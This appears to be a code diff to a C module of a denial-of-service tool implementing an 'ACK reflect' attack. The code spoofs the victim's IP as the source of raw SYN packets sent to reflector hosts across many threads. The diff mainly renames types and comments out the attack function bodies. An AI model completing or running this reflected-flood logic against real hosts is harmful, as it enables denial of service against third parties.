@@ -20,29 +20,15 @@
 #include <sys/types.h>
 #include <signal.h>
 
-#include "main.h"
-#include "ack_reflect_dos.h"
+#include "../main.h"
+#include "../debug.h"
 
-extern size_t ShowMessage(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
-extern size_t InfoMessage(const char *fmt, ...);
-extern size_t DebugMessage(const char *fmtsring, ...);
-extern size_t ErrorMessage(const char *fmt, ...);
-
-extern void FreeProcessACKIPListBuff(pStrHeader p);
-extern size_t ProcessACKIPListFile(pStrHeader *output);
-extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
-extern size_t LocateStrNodeElement(const pStrHeader p, pStrNode *element, const size_t loc);
-
-extern void FreeSplitUrlBuff(pSplitUrlOutput p);
-extern int SplitUrl(const char *url, pSplitUrlOutput *output);
-extern void SignalExit(int signo);
-
-extern size_t SplitIPForThread(pIPList_Thread *output, const pInput input, const pStrHeader str_header);
-extern void FreeIPListBuff(pIPList_Thread input);
+#include "ack_reflect.h"
 
 static int SendSYN(const pSYNStruct ss, const int debug_level)
 {
     // this belong to the ack reflect attack part
+    /*
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if (socket_fd < 0)
     {
@@ -181,6 +167,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     //sleep(1);
 
     close(socket_fd);
+    */
     return 0;
 }
 
@@ -201,9 +188,10 @@ static int AttackThread(pSYNStruct syn_struct)
 {
     // now we start the syn flood attack
 
+    /*
     int i;
     pStrNode str_node = syn_struct->str_header->next;
-    pSplitUrlOutput split_result;
+    pSplitUrlRet split_result;
 
     ShowMessage(VERBOSE, syn_struct->debug_level, "AttackThread start sending data...");
 
@@ -268,26 +256,28 @@ static int AttackThread(pSYNStruct syn_struct)
 
         str_node = str_node->next;
     }
+    */
     return 0;
 }
 
-int StartACKReflectAttack(const pInput input)
+int StartACKReflectAttack(const pParameter input)
 {
     // run function in thread
     // this attack type must run as root
 
+    /*
     pthread_t tid[input->max_thread];
     pthread_attr_t attr;
     int j, ret;
 
-    ShowMessage(VERBOSE, input->debug_level, "Enter StartSYNFlood");
+    ShowMessage(VERBOSE, input->debug_mode, "Enter StartSYNFlood");
     signal(SIGINT, SignalExit);
     // syn_struct will into the AttackThread function
     pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
     pStrHeader str_header;
-    pSplitUrlOutput split_result;
+    pSplitUrlRet split_result;
 
-    syn_struct->debug_level = input->debug_level;
+    syn_struct->debug_level = input->debug_mode;
     syn_struct->each_ip_repeat = input->each_ip_repeat;
 
     if (!ProcessACKIPListFile(&str_header))
@@ -296,7 +286,7 @@ int StartACKReflectAttack(const pInput input)
         return 1;
     }
 
-    /* ************************* get the source ip address for syn package ************************* */
+    // get the source ip address for syn package
 
     // split the target address as the traffic source ip address
     // make the source ip as the target ip address
@@ -336,7 +326,7 @@ int StartACKReflectAttack(const pInput input)
 
     FreeSplitUrlBuff(split_result);
 
-    /* ************************* here we will split the str_header list for each thread ************************* */
+    // here we will split the str_header list for each thread
     pIPList_Thread list, tmp_list;
     if (!SplitIPForThread(&list, input, str_header))
     {
@@ -354,10 +344,7 @@ int StartACKReflectAttack(const pInput input)
         // start again
         for (j = 0; j < input->max_thread; j++)
         {
-            /* 
-                 * every thread has onlyone target address
-                 * thread end try next address
-                 */
+            // every thread has onlyone target address thread end try next address
             syn_struct->str_header = tmp_list->list;
             tmp_list = tmp_list->next;
             //DisplayWarning("syn_struct src_ip: %s", syn_struct->src_ip);
@@ -377,11 +364,11 @@ int StartACKReflectAttack(const pInput input)
             // create thread
             ret = pthread_create(&tid[j], &attr, (void *)AttackThread, syn_struct);
             //printf("j is: %d\n", j);
-            ShowMessage(DEBUG, input->debug_level, "tid: %ld", tid[j]);
+            ShowMessage(DEBUG, input->debug_mode, "tid: %ld", tid[j]);
             // here we make a map
             if (ret != 0)
             {
-                ShowMessage(DEBUG, input->debug_level, "ret: %d", ret);
+                ShowMessage(DEBUG, input->debug_mode, "ret: %d", ret);
                 ErrorMessage("Create pthread failed");
                 return 1;
             }
@@ -402,22 +389,24 @@ int StartACKReflectAttack(const pInput input)
     // many process: actually this is not neccessary
     FreeSYNStructBuff(syn_struct);
     FreeIPListBuff(list);
+    */
     return 0;
 }
 
-int StartACKReflectTest(const pInput input)
+int StartACKReflectTest(const pParameter input)
 {
     // run function in thread
     // this attack type must run as root
-    ShowMessage(VERBOSE, input->debug_level, "Enter StartSYNFlood");
+    /*
+    ShowMessage(VERBOSE, input->debug_mode, "Enter StartSYNFlood");
 
     signal(SIGINT, SignalExit);
     // syn_struct will into the AttackThread function
     pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
     pStrHeader str_header;
-    pSplitUrlOutput split_result;
+    pSplitUrlRet split_result;
 
-    syn_struct->debug_level = input->debug_level;
+    syn_struct->debug_level = input->debug_mode;
     syn_struct->each_ip_repeat = input->each_ip_repeat;
 
     if (!ProcessACKIPListFile(&str_header))
@@ -426,7 +415,7 @@ int StartACKReflectTest(const pInput input)
         return 1;
     }
 
-    /* ************************* get the source ip address for syn package ************************* */
+    // get the source ip address for syn package
 
     // split the target address as the traffic source ip address
     // make the source ip as the target ip address
@@ -466,7 +455,7 @@ int StartACKReflectTest(const pInput input)
 
     FreeSplitUrlBuff(split_result);
 
-    /* ************************* here we will split the str_header list for each thread ************************* */
+    // here we will split the str_header list for each thread
     pIPList_Thread list;
     if (!SplitIPForThread(&list, input, str_header))
     {
@@ -486,6 +475,7 @@ int StartACKReflectTest(const pInput input)
 
     FreeSYNStructBuff(syn_struct);
     FreeIPListBuff(list);
+    */
 
     return 0;
 }
